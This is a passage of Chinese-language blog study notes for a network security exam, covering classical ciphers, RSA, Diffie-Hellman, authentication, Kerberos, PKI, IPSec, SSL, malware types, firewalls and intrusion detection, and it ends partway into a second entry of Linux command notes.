id="计算题："><a href="#计算题：" class="headerlink" title="计算题："></a>计算题：</h4><h5 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h5><p>该密码体制有一个参数n。在加解密时，同样把英文字母映射为0－25的数字再进行运算，并按n个字母一组进行变换。明文空间、密文空间及密钥空间都是长度为n的英文字母串的集合，因此可表示 </p><blockquote><p>加密变换定义如下：</p><p>设密钥 k=(k1,k2,…,kn), 明文m=(m1,m2,…,mn), 加密变换为：Ek(m)=(c1,c2,…,cn), 其中ci(mi + ki)(mod26)，i =1,2,…,n</p><p>对密文 c=(c1,c2,…,cn),  解密变换为：Dk(c)=(m1,m2,…,mn), 其中 mi=(ci －ki)(mod26)，i =1,2,…,n</p></blockquote><h5 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h5><blockquote><p>Hill密码算法的基本思想是将n个明文字母通过线性变换，将它们转换为n个密文字母，解密即做逆变换</p></blockquote><p>算法的密钥K ={ <img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1676351740534.png" style="zoom:67%;" />上的N·N的可逆矩阵}，明文M与密文C均为n维向量</p><p>其中：</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码计算.png" style="zoom: 67%;" /><p>有</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码计算矩阵形式.png" style="zoom: 80%;" /><p>或写成</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码加密.png" style="zoom:67%;" /><p>解密变换则为：</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码解密.png" style="zoom:67%;" /><h5 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h5><ul><li><p>密钥的生成</p><ol><li>选择两个大素数 p，q，（p，q为互异素数，需要保密）</li><li>计算n = p×q， ψ(n) = (p－1)×(q－1)</li><li>选择整数 e 使 (ψ(n)，e) =1,   1&lt;e&lt; ψ(n) </li><li>计算d，使d = e－1mod ψ(n),</li><li>得到：公钥 为{e,n}； 私钥为{d}</li></ol></li><li><p>加密(用e，n):         明文：M &lt; n， 密文C = M ^ e(mod n)</p></li><li><p>解密(用d，n)：      密文C， 明文M = C ^ d (mod n)</p></li></ul><h5 id="Diffe-Hellman-秘钥交换协议"><a href="#Diffe-Hellman-秘钥交换协议" class="headerlink" title="Diffe-Hellman 秘钥交换协议"></a>Diffe-Hellman 秘钥交换协议</h5><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/Diffe-Hellman 秘钥交换协议.png" style="zoom: 67%;" /><h4 id="综合题："><a href="#综合题：" class="headerlink" title="综合题："></a>综合题：</h4><ul><li><p><strong><font color=orange>如何利用公钥密码技术实现    即加密又认证 （综合题）</font></strong></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/公钥密码技术实现加密及认证.png" style="zoom:50%;" /><p>提供保密：KUb        提供鉴别和签名:KRa    明文消息M</p><blockquote><p><font color=orange>Alice用自己的私钥进行数字签名，并与源文件一起用Bob的私钥进行加密</font></p><p><font color=orange>Bob在收到数据后用自己的私钥进行解密，并可以用Alice的公钥进行验证</font></p></blockquote></li><li><p><strong><font color=orange>如何利用公钥密码技术实现    混合加密 （综合题）</font></strong></p></li></ul><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/混合加密计算.png" style="zoom: 50%;" /><ul><li><p><strong><font color=orange>Diffe-Hellman安全性分析 (综合题)</font></strong></p><blockquote><p>网络安全课本P55页</p></blockquote><ul><li><p>Diffie-Hellman算法的优点:</p><ol><li>仅当需要时才生成密钥,减小了将密钥存储很长一段时间而致使遭受攻击的机会</li><li>除对全局参数的约定外,密钥交换不需要事先存在的基础结构</li></ol></li><li><p>缺点：</p><ol><li>在协商密钥的过程中,没有对双方身份的认证</li><li>它是计算密集性的,因此容易遭受阻塞性攻击:攻击方请求大量的密钥,而受攻击者花费了相对多的计算资源来求解无用的幂系数而不是在做真正的工作</li><li>没办法防止重放攻击</li><li>容易遭受”中间人攻击”，即恶意第三方C在和A通信时扮演B,和B通信时扮演A,与A和B都协商了一个密钥,然后C就可以监听和传递通信量</li></ol></li></ul></li></ul><h4 id="思考题：-1"><a href="#思考题：-1" class="headerlink" title="思考题："></a>思考题：</h4><ul><li><p><strong><font color=red>简述密码体制及其组成成分：</font></strong></p><ul><li>用于加解密并能解决网络安全中的机密性、完整性、可用性、可控性和真实性等问题中的一个或几个的系统称为密码体制</li><li>包括密文空间C，明文空间P，秘钥空间K , 加密算法E，与解密算法D</li></ul></li><li><p><strong>简述对称密码算法的基本原理</strong></p><ul><li>对称算法又叫传统密码算法:加密密钥能够从解密密钥中推算出来,反过来也成立。</li><li>对称算法要求发送者和接收者在安全通信之前,协商一个密钥。</li><li>对称算法的安全性依赖于密钥,泄漏密钥就意味着任何人都能对消息进行加解密。</li><li>对称算法的加密和解密表示为:EK(M)=C </li></ul></li><li><p><strong>简述对称密码算法和非对称密码算法的区别：</strong></p><ul><li><p>在对称密码体制中，加密和解密使用完全相同的秘钥，或者加密秘钥和解密秘钥彼此之间非常容易推导。在公钥密码体系中，加密和解密使用不同的秘钥，而且由其中的一个推导另一个是非常困难的。在两个秘钥中，一个是公开的，而另一个保持秘密性<del>（老师表示这个答案有错）</del></p></li><li><p>在安全性方面，对称密钥密码体制是基于复杂的非线性变换与迭代运算实现算法安全性的，而非对称密钥密码体制则一般是基于某个公认的数学难题而实现安全性的。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 这部分来自密码学课件，至少比课本上全面</span>对称秘钥密码体制：加密、解密运算的处理速度块，效率高，算法安全性高，对称密码算法的密钥分发过程复杂，所花代价高； 密钥管理量的困难；保密通信系统的开放性差； 存在数字签名的困难性非对称密码体制：密钥分配简单，系统密钥量少，便于管理 ，系统开放性好，且可以实现数字签名。加密、解密运算效率较低，处理速度较慢，同等安全强度下，非对称密码体制的密钥位数较多<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong><font color=red>RSA算法的理论基础是什么？简述RSA算法的流程？</font></strong></p><ul><li>大整数的素因子分解是困难问题，即求两个大素数的乘积是容易的，但是将一个大整数分解成两个大素数之积则是困难的<ul><li>选取两个大素数p和q，两个数长度接近，一般在256比特长</li><li>计算n=p * q, ψ(n)=(p-1)(q-1)</li><li>随机选取整数e，满足gcd(e, ψ(n))=1</li><li>计算d，满足d*e=1（modψ(n)）</li><li>n公开， p和q保密   e为公钥，d为私钥。</li><li>消息m &lt; n<br>加密算法：c=E(m)=m^e   (mod n)<br>解密算法：m=D(c)=c^d   (mod n)<br>签名： s=md(mod n)</li></ul></li></ul></li><li><p> <strong><font color=orange>D-h的中间人攻击（简答）</font></strong></p></li></ul>  <img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/D-h的中间人攻击.png"  /><h3 id="第三章-消息鉴别与数字签名"><a href="#第三章-消息鉴别与数字签名" class="headerlink" title="第三章 消息鉴别与数字签名"></a>第三章 消息鉴别与数字签名</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># 考点：消息加密 ， MAC函数 ， 哈希函数 ， 公钥密码签名等 ， A - B 公钥加密与签名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h4><ul><li><p><strong>消息鉴别主要用于对抗哪种类型的攻击？</strong></p><ul><li>消息鉴别主要用于对抗伪造消息和篡改消息（包括内容篡改，序号篡改与时间篡改）</li></ul></li><li><p><strong><font color=red>根据鉴别符的生成方式，鉴别函数可分为哪几类？各自具有什么特点？（掌握）</font></strong></p></li><li><p>基于鉴别符的生成方式，鉴别函数可分为如下3类：</p></li><li><p>基于消息加密方式的鉴别：以<strong>整个消息的密文为鉴别符</strong></p><ul><li>基于消息鉴别码（MAC）的鉴别：利用公开函数和秘钥产生一个较短的定长值作为鉴别符，并与消息一同发送给接收方，实现对消息的验证。</li><li>基于散列函数的鉴别：利用公开函数将任意长的消息映射为定长的散列值，并以该散列值作为鉴别符</li></ul></li><li><p><strong><font color=red>散列函数应该具有哪些安全特性？（掌握）</font></strong></p></li><li><p>散列函数必须满足一定的安全特征，主要包括3个方面：单向性、强对抗碰撞性和弱对抗碰撞性</p><ul><li>单向性：对任意给定的散列码h，找到满足H（x）=h的x在计算上是不可行的，即给定散列函数h，由消息M计算散列值H(M)是容易的，但是由散列值H(M)计算</li><li>强对抗碰撞性：散列函数满足，散列函数h的输入是任意长度的的消息M，散列函数h的输出是定长的数值，给定h和M计算h(M)是容易的，给定散列函数h，寻找两个不同的消息M1和M2，使得h (M1) = h (M2)在计算上是不可行的</li><li>弱对抗碰撞性：散列函数满足，散列函数h的输入是任意长度的的消息M，散列函数h的输出是定长的数值，给定h和M计算h(M)是容易的，给定散列函数h和一个随机的消息M，寻找消息M1使得h (M) = H(M1)在计算上是不可行的。</li></ul></li><li><p><strong><font color=skyblue>什么是数字签名？数字签名具有哪些特征？（理解）</font></strong></p></li><li><p>数字签名是手写签名的数字化形式，是公钥密码学发展过程中最重要的概念之一<del>（是指附加在某一电子文档中的一组特定的符号或代码）</del>  删除线内是课件的内容</p><ul><li>数字签名的特征<ul><li>可验证性：信息接收方必须能够验证发送发的签名是否真实有效</li><li>不可伪造性： 除签名人外，任何人不能伪造签名人的合法签名。</li><li>不可否认性： 发送放在发送签名消息后。无法抵赖发送的行为；接收方在收到消息后，也无法否认接收的行为</li><li>数据完整性： 数字签名使得发送方能够对消息的完整性进行校验<del>（数字签名具有消息鉴别的功能）</del></li></ul></li></ul></li><li><p><strong>简述基于公钥密码的数字签名原理？</strong></p><ul><li>假定接收方已知发送放的公钥，则发送放则可以用自己的私钥对整个消息或消息的散列码加密来产生数字签名，接受放用发送方的公钥对签名进行验证从而确认签名和消息的真实性</li></ul></li></ul><h3 id="第四章-身份认证"><a href="#第四章-身份认证" class="headerlink" title="第四章 身份认证"></a>第四章 身份认证</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># Kerberos    X.509版本3 包含哪一些字段    PKI体系结构<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="思考题-1"><a href="#思考题-1" class="headerlink" title="思考题"></a>思考题</h4><p><strong><font color=orange>思考题2,3,4综合复习（？）</font></strong></p><ul><li><p><font color=orange>设计Kerberos是为了解决哪些问题？</font></p></li><li><p>Kerberos的设计目的就是解决分布式网络环境下用户访问网络资源时的安全问题，即工作站的用户希望获得服务器上的服务、服务器能够对服务请求进行认证，并能限制授权用户的访问</p></li><li><p><font color=orange>在Kerberos中，什么是门票？什么是门票分发门票？</font></p><ul><li>用户需要访问远程服务或资源，其工作站代替用户向KDC提出申请。KDC为双方生成一个共享密钥，并分别用用户和远程服务的主密钥加密这个会话密钥，再将这些信息发送给工作站。该消息包括用远程资源或服务的主密钥加密的会话密钥，以及用户的名字等信息。这部分信息称为访问远程资源的门票**<del>（这部分内容来自课件）</del>**</li><li>工作站向KDC申请会话密钥，KDC生成会话密钥，并发送一个门票分发门票(TGT)给工作站，TGT包括用KDC的主密钥加密的会话密钥，还包括用户名字和会话密钥过期时间等。</li></ul></li><li><p><font color=orange>简述Kerberos用户中用户工作站获得会话秘钥和TTG的过程以及获得服务授权门票的过程</font></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/获得会话秘钥与TGT.png" style="zoom: 50%;" /><p><strong><font color=orange>获取服务授权门票见课本P89</font></strong></p></li><li><p>什么是证书，证书的基本功能是什么？</p><ul><li>证书就是一种经过签名的消息，用来确定某个名字和某个公钥的绑定关系</li></ul></li><li><p>简述X.509双向认证过程</p><ul><li><p style="color:blue;">课本100页大段,因为存在大段公式推荐看课本</p></li></ul></li><li><p>一个完整的PKI应用系统包括哪些组成成分？各自具有什么功能？</p><ul><li>一个完整的PKI应用系统必须包括：权威认证机构（CA）、数字证书库、秘钥备份及恢复系统、证书作废系统、应用接口（API）等基本构成部分<ul><li>权威认证机构（CA）：是PKI的核心执行机构，是数字证书生成、发放的运行实体，一般情况下也是证书撤销列表(CRL)的发布点</li><li>数字证书库：证书库是CA颁发证书和撤销证书的集中存放地，可以供公众进行开放式查询</li><li>秘钥备份及恢复系统：提供备份与恢复秘钥的机制</li><li>证书作废系统：</li><li>应用接口（API）：提供良好的应用接口系统使得各个的应用程序能够以安全、一致可信的方式与PKI交互</li></ul></li></ul></li></ul><h3 id="第五章-Internet安全"><a href="#第五章-Internet安全" class="headerlink" title="第五章 Internet安全"></a>第五章 Internet安全</h3><h4 id="思考题-2"><a href="#思考题-2" class="headerlink" title="思考题"></a>思考题</h4><ul><li><p><strong><font color=skyblue>IPSec提供哪些服务？（考察）</font></strong></p><p style="color:blue;">IPSec将密码技术应用在网络层，提供端对端通信数据的私有性、完整性、真实性、防重放攻击等安全服务</p></li><li><p><strong><font color=skyblue>什么是SA？SA由哪些参数来表示？（考察）</font></strong></p><ul><li><p>安全关联(SA)是IP的认证和保密机制中的核心概念，一个安全关联是发送方和接收方之间受到密码技术保护的单向关系，该关系对所携带的通信流量提供安全服务</p></li><li><p style="color:blue;">一个安全关联由3个参数确定：安全参数索引(SPI)。目标IP地址、安全协议表示</p></li></ul></li><li><p><strong><font color=skyblue>传输模式和隧道模式有何区别？（考察）</font></strong></p><ul><li>从安全性来讲，隧道模式优于传输模式。它可以完全地对原始IP数据报进行验证和加密。隧道模式下可以隐藏内部IP地址，协议类型和端口</li><li>从性能来讲，隧道模式因为有一个额外的IP头，所以它将比传输模式占用更多带宽</li><li>从场景来讲，传输模式主要应用于两台主机或一台主机和一台VPN网关之间通信；隧道模式主要应用于两台VPN网关之间或一台主机与一台VPN网关之间的通信。</li><li>当安全协议同时采用AH和ESP时，AH和ESP协议必须采用相同的封装模式。 </li></ul></li><li><p><strong><font color=skyblue>AH协议和ESP协议各自提供哪些安全服务？（考察）</font></strong></p><ul><li>IP认证头(AH)协议为IP数据包提供数据完整性校验和身份认证，还有可选择的抗重放攻击保护，但不提供数据加密服务</li><li>封装安全载荷(ESP) 协议为IP数据包提供数据完整性校验、身份认证和数据加密，还有可选择的抗重放攻击保护</li></ul></li><li><p><strong><font color=red>SSL由哪些协议组成？各自完成什么功能？（掌握 大题）</font></strong></p><ul><li>SSL不是单个的协议，而是两层协议<ul><li>SSL记录协议基于可靠的传输层协议，用来封装高层协议</li><li>高层协议主要包括SSL握手协议、修改密码参数协议、报警协议、应用数据协议（如HTTP）等</li></ul></li><li>SSL协议的功能：<ul><li>SSL记录协议：为高层协议提供基本的安全服务：保密和消息完整性</li><li>SSL握手协议：握手协议在SSL记录层之上，负责建立当前会话状态的参数</li><li>SSL修改密码规程协议：该消息将改变连接所使用的加密规约</li><li>告警协议：规定了告警的级别和告警的类型，在SSL协议执行过程中通过告警协议来显示信息交换过程中所发生的错误</li></ul></li></ul></li><li><p><strong><font color=red>描述SSL协议的基本流程。（掌握 大题）</font></strong></p><ul><li>在基本流程中，客户端A发起与服务器B的链接，然后B把自己的证书发送给A。A验证B的证书，从中提取B的公钥,然后选择一个用来计算会话秘钥的随机数，将其用B的公钥加密发送给B。基于这个随机数，双方计算出会话密钥(主秘钥)。然后通信双方使用会话秘钥对会话数据进行加密和完整性保护</li><li>P122页还有其他内容…….</li></ul></li><li><p><strong>发送时，SSL记录协议都执行了哪些操作？分别完成什么功能？</strong></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/SSL记录协议.png" style="zoom:50%;" /><ul><li>从上层接收要发送的数据，对信息进行分段，成若干记录，使用指定的压缩算法进行数据压缩数据（可选）；使用指定的MAC算法生成MAC；使用指定的加密算法进行数据加密；发送数据</li></ul></li><li><p><strong>简述SSL握手协议的流程。</strong></p><ul><li><p>第一阶段 安全能力的建立</p><blockquote><p>(1) 客户 → 服务器 ：client_hello                        (2) 服务器 → 客户 ：server_hello</p></blockquote></li><li><p>第二阶段 服务器认证和密钥交换</p><blockquote><p>(3) 服务器 → 客户 ：server_certificate             (4) 服务器 → 客户 ：server_key_exchange<br>(5) 服务器 → 客户 ：certificate_request           (6) 服务器 → 客户 ：server_hello_done</p></blockquote></li><li><p>第三阶段  客户认证和密钥交换</p><pre class="line-numbers language-none"><code class="language-none">(7) 客户 → 服务器 ：client_certificate(8) 客户 → 服务器 ：client_key_exchange(9) 客户 → 服务器 ：certificate_verify<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>第四阶段  结束阶段</p><pre class="line-numbers language-none"><code class="language-none">(10) 客户 → 服务器 ：change_cipher_spec(11) 客户 → 服务器 ：finished(12) 服务器 → 客户 ：change_cipher_spec(13) 服务器 → 客户 ：finished<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h3 id="第六章-恶意代码"><a href="#第六章-恶意代码" class="headerlink" title="第六章 恶意代码"></a>第六章 恶意代码</h3><h4 id="思考题-3"><a href="#思考题-3" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong>什么是恶意代码？主要包括哪些类型？</strong><ul><li>经过存储介质和计算机网络进行传播，从一台计算机系统到另外一台计算机系统，未经授权而破坏计算机系统安全性和完整性的程序或代码</li><li>恶意代码包括：计算机病毒、木马、蠕虫、逻辑炸弹、脚本病毒、用户级RootKit、核心级RootKitd等</li></ul></li><li><strong><font color=red>计算机病毒的概念及特征是什么？ （大题或小题）</font></strong><ul><li>计算机病毒是一种人为编制的、能够对计算机正常程序的执行或数据文件造成破坏，并且能够自我复制的一组指令程序代码</li><li>其特性包括：破坏性、传染性、隐蔽性、潜伏性、多态性、不可预见性</li></ul></li><li><strong><font color=red>什么是木马？木马和病毒有哪些主要区别？</font></strong><ul><li>木马是有隐藏性的、可与远程计算机建立连接，使远程计算机能够通过网络控制本地计算机的恶意程序。 </li><li>病毒与木马的区别<ul><li>木马通常不像传统病毒那样感染文件。木马一般是以寻找后面、窃取密码和重要文件为主，还可以对计算机进行跟踪监视、控制、查看、修改资料等操作，具有很强的屏蔽性、突发性与攻击性。</li><li>传统的文件型病毒寄生于正常可执行程序体内，通过寄主程序的执行而执行，大多数木马程序都有一个独立的可执行文件</li></ul></li></ul></li><li><strong><font color=red>什么是蠕虫？蠕虫有哪些技术特性？</font></strong><ul><li>蠕虫是一种结合黑客技术和计算机病毒技术，利用系统漏洞和应用软件的漏洞，通过复制自身进行传播的、完全独立的程序代码。</li><li>蠕虫病毒具有的技术特性有：跨平台、多种攻击手段、极快的传播速度、多态性、可变形性、传输载体与零时间探测利用等特性</li></ul></li></ul><h3 id="第七章-防火墙"><a href="#第七章-防火墙" class="headerlink" title="第七章 防火墙"></a>第七章 防火墙</h3><h4 id="思考题-4"><a href="#思考题-4" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong>什么是防火墙？它有哪些功能和局限性？</strong><ul><li><del>防火墙是一个由软件和硬件组合而成的、起过滤和封锁作用的计算机或网络系统，一般部署在本地网络和外部网络之间</del>（P175定义 老师说不是这个）</li><li>防火墙是一种建立在被认为是安全可信的内部网和和被认为不太安全可信的外部网之间的访问控制机制，是安全策略的具体体现（P176 定义）</li><li>还包括屏蔽主机防火墙（单堡垒主机）、屏蔽主机防火墙（双宿堡垒主机防火墙）、屏蔽子网防火墙等</li><li>防火墙的作用是隔离风险区域和安全区域的连接，阻止不希望的或者未授权的通信进入内部网，通过边界控制强化内部网的安全，同时不会妨碍内部网对外部网的访问</li><li>防火墙的功能：访问控制功能、内容控制功能、日志功能、集中管理功能、自身安全和可用性<ul><li>访问控制功能</li><li>内容控制功能</li><li>日志功能</li><li>集中管理功能</li><li>自身安全和可用性</li></ul></li><li>防火墙的局限性<ul><li>防火墙不能防御不经由防火墙的攻击</li><li>防火墙不能防范来自内部的威胁</li><li>防火墙不能防止病毒感染的程序和文件进出内部网</li><li>防火墙不能防止数据驱动式的攻击</li></ul></li></ul></li><li><strong><font color=red>简述包过滤原理</font></strong><ul><li>将IP数据报的各种包头信息与防火墙内建规则进行比较，然后根据过滤规则有选择地阻止或允许数据包通过防火墙。</li><li>这些过滤规则也称作访问控制表(access control table)。流入数据流到达防火墙后。</li><li>防火墙就检查数据流中每个IP数据报的各种包头信息。例如源地址、目的地址、源端口、目的端口、协议类型,来确定是否允许该数据包通过。一旦该包的信息匹配了某些特征,则防火墙根据其内建规则对包进行相应的操作，选择是否接收/丢弃 策略包</li></ul></li><li><strong>状态检查技术具有哪些特点？(小题)</strong><ul><li>对用户透明，能够在OSI/RM网络层上通过IP地址和端口号过滤进出的数据包</li><li>可以在OSI/RM应用层上检查数据包内容，查看这些内容是否符合安全规则</li><li>克服了包过滤技术和代理服务技术的局限性，能够根据协议、端口及源地址、目的地址的具体情况决定数据包是否通过</li><li>对于每个安全策略允许的请求，状态监测技术启动相应的进程，可快速的确认符合授权标准的数据包，使得运行速度加快</li></ul></li><li><strong><font color=red>简述屏蔽子网防火墙的结构</font></strong><ul><li>使用了两个包过滤路由器，一个在堡垒机和internet之间，称为外部屏蔽路由器，一个在堡垒主机和内部网络之间称为内部屏蔽路由器</li><li>每一个路由器都被配置为只和堡垒主机交换流量。外部路由器使用标准过滤来限制对堡垒主机的外部访问,内部路由器则拒绝不是堡垒主机发起的进人数据包,并只把外出数据包发给堡垒主机。</li></ul></li></ul><h3 id="第八章-网络攻击与防范"><a href="#第八章-网络攻击与防范" class="headerlink" title="第八章 网络攻击与防范"></a>第八章 网络攻击与防范</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 本章考点如下</span><span class="token operator">-</span> Dos与DDos 简答题<span class="token operator">-</span> 在入侵检测上同时存在大题和小题<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="思考题-5"><a href="#思考题-5" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong><font color=red>简述网络攻击的过程？（掌握）</font></strong><ul><li>网络攻击的过程可以归纳为：隐藏自身，踩点与扫描，侵入系统并提升权限，种植后门，网络隐身五个步骤<ul><li><strong>1 隐藏自身：</strong></li><li><strong>2 踩点与扫描：</strong></li><li><strong>3 侵入系统并提升权限</strong></li><li><strong>4 种植后门：</strong></li><li><strong>5 网络隐身：</strong>在成功侵入目标主机并植入后门后需要清除登录日志及其他相关日志</li></ul></li></ul></li><li><strong>在整个DDos攻击过程中都有哪些角色？分别完成什么功能？</strong><ul><li>DDos攻击过程中涉及四种主机：攻击者，主控傀儡机，攻击傀儡机，被攻击者<ul><li>攻击者：发布实施DDos的指令，是整个DDos攻击中的主控平台</li><li>主控傀儡机：通过这些主机分别控制大量的攻击傀儡机，能够接收攻击者发来的特殊指令，而且可以把这些指令发送到攻击傀儡机上</li><li>攻击傀儡机： 攻击傀儡机是攻击的直接执行者，直接向被攻击主机发起攻击</li><li>被攻击者：是DDos攻击的直接受害者，目前多为一些大型企业的网络和数据库系统</li></ul></li></ul></li><li><strong><font color=red>简述僵尸网络的工作原理？（掌握 大题）</font></strong><ul><li>僵尸网络的概念：僵尸网络是攻击者处于恶意目的，融合传统的恶意软件，如计算机病毒，蠕虫和木马等技术，传播僵尸程序感染大量主机，并通过一对多的命令与控制信道被感染的主机所组成的叠加网络。<ul><li>僵尸网络利用其所控制的僵尸主机群发起攻击，其活动可以分为四个阶段<ol><li>感染目标主机构建僵尸网络</li><li>发布命令，控制僵尸程序</li><li>展开攻击</li><li>攻击善后，主要目的是隐藏攻击痕迹，防止被追踪溯源</li></ol></li></ul></li></ul></li><li><strong>什么是入侵检测？ 入侵检测的典型过程是什么？</strong><ul><li>入侵检测是指在计算机网络或计算机系统中若干关键点收集信息并对收集到的信息进行分析，从而判断是网络或系统中是否有违反安全策略的行为和被攻击的迹象。它是对入侵行为的发觉</li><li>入侵检测的典型过程是：信息收集、信息（数据）预处理，数据的检测分析，根据安全策略做出响应，有的还包括检测效果的评估</li></ul></li><li><strong>IDS的基本功能是什么？典型的IDS包括哪些实体？</strong><ul><li>入侵检测系统（IDS）是完成入侵检测的功能的软件、硬件的组合；是对敌对攻击在适当的时间内进行检测并做出响应的一种工具</li><li>典型的IDS包括事件生成器、事件分析器、事件数据库、响应单元、目录服务器<ul><li>事件生成器：事件生成器是采集和过滤事件数据的程序和模块，负责收集原始数据</li><li>事件分析器：事件分析器是分析事件数据和任何CIDF组件传送给他的各种数据。</li><li>事件数据库：负责存放各种数据原始数据或已加工过的数据</li><li>响应单元： 是针对分析组件所产生的分析结果，根据响应策略采取响应的行为，发出命令响应攻击</li><li>目录服务器： 用于各组件定位其他组件，以及控制其他组件传递的数据并认证其他组件的使用，以防止其他组件的使用，以防止入侵检测系统本身受到攻击。</li></ul></li></ul></li><li><strong>简述异常检测和误用检测的基本原理？</strong> <ul><li>异常检测原理： 任何一种入侵行为都由于其偏离正常或者所期望的系统和用户的活动规律而被检测出来</li><li>误用检测原理： 建立在对过去各种已知网络入侵方法和系统缺陷知识的积累之上。入侵检测系统中存储着一系列已知的入侵行为描述，当某个系统的调用与一个已知的入侵行为相匹配时，则认为是入侵行为</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 知识点汇总</title>
      <link href="/2023/02/10/Linux%20%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/"/>
      <url>/2023/02/10/Linux%20%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h2><center>Linux 知识点汇总</center></h2>[TOC]<h4 id="P4-Linux的基本特征-8个"><a href="#P4-Linux的基本特征-8个" class="headerlink" title="P4: Linux的基本特征 8个"></a>P4: Linux的基本特征 8个</h4><ul><li><strong>开放性</strong>：系统遵循世界标准规范，特别是遵循开放系统互连(OSI) 国际标准 </li><li><strong>多用户</strong>：系统资源可以被不同的用户各自拥有使用。每个用户对自己的资源有特定的权限，互不影响。</li><li><strong>多任务</strong>：计算机同时执行多个程序，而且各个程序的运行互相独立。Linux系统调度每一个进程平等地访问微处理器</li><li><strong>快速性</strong>：Linux 不大在意CPU的速度，它可以把处理器的性能发挥到极限</li><li><strong>安全性</strong>：Iinux 采取了许多安全技术措施，包括对读、写进行权限控制，带保护的子系统、审计跟踪、核心授权等，这为网络多用户环境中的用户提供了必要的安全保障</li><li><strong>网络性</strong>：Linux 是在Internet的基础上产生并发展起来的，因此，完善的内置网络是Linux的一大特点。</li><li><strong>移植性</strong>：Linux能够在从微型计算机到大型计算机的任何环境中和任何平台上运行。</li><li><strong>兼容性</strong>：Linux是一款与POSI (Portable Operating System Interface)相兼容的操作系统，它所构成的子系统支持所有相关的ANSI、ISO、 IETF 和W3C业界标准。</li></ul><h4 id="P25-26-关机与注销"><a href="#P25-26-关机与注销" class="headerlink" title="P25-26: 关机与注销"></a>P25-26: 关机与注销</h4><ol><li><p>从图形界面关机：右上角齿轮</p></li><li><p>从命令行关机</p><ul><li><p><strong>关机命令 shutdown</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># shutdown &#x2F;&#x2F;要等待一会儿# shutdown +5 &#x2F;&#x2F;5min后关机# shutsown 19:20 &#x2F;&#x2F;19：20关机-f&#x2F;-F 重新启动时执行&#x2F;不执行fsck-k 仅送出信息给所有用户，不会实际关机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>注销命令 exit</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">exit [状态值]&#x2F;&#x2F; 0表示执行成功，其他值表示失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>重启命令 reboot</p><pre class="line-numbers language-none"><code class="language-none">-d 重启时不把数据写入记录文件-n 重开机前不检查有未结束的程序-w 仅测试不重启，把数据写入记录文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li></ol><p><strong>（第三章 考试重点）</strong></p><h4 id="P57-Shell常用特殊符号-7个"><a href="#P57-Shell常用特殊符号-7个" class="headerlink" title="P57: Shell常用特殊符号 7个"></a>P57: Shell常用特殊符号 7个</h4><ul><li>“ ***** “ 表示一个(包括空字符)或多个字符组成的字符串</li><li>“ <strong>?</strong> “ 表示单个字符</li><li>“ <strong>[]</strong> “ 用于指定显示内容范围</li><li>“ <strong>!</strong> “ 用于指定不显示内容，与” <strong>[]</strong> “一同使用</li><li>“ <strong>;</strong> “ 用于同一行中分隔多个命令</li><li>“ <strong>`</strong> “ 命令替代符，包含内容在Shell中为一条命令，并被执行</li><li>“ <strong>#</strong> “ 注释符号，该行内容不被执行</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls -l &#x2F;bin&#x2F;e*  &#x2F;&#x2F;查看&#x2F;bin目录下的e开头的所有文件和文件夹ls -l &#x2F;bin&#x2F;e？ &#x2F;&#x2F;查看e开头，长度为2的所有文件和文件夹ls [a-c]  &#x2F;&#x2F;为a b c的文件和文件夹ls [!a-c]     &#x2F;&#x2F;显示名不为为a b c的文件和文件夹ls -l  &#x2F;&#x2F;显示目录下的文件和文件夹和查看其详细信息echo &#96;ls -l&#96;  &#x2F;&#x2F;字符串输出为指令执行结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="P57-Shell常用操作-4个"><a href="#P57-Shell常用操作-4个" class="headerlink" title="P57: Shell常用操作 4个"></a>P57: Shell常用操作 4个</h4><ul><li><p>自动命令补全功能 